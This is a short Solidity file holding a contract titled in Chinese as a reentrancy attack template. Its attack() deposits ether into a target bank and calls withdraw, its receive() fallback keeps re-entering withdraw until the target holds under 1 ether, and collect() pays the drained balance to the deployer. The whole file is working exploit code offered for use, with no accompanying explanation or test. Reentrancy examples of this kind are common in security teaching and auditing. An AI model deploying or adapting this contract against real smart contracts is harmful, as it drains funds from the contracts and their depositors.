// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrancyAttacker - 重入攻击模板
contract ReentrancyAttacker {
    IBank public target;
    address public owner;

    constructor(address _target) {
        target = IBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "send at least 1 ether");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    function collect() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
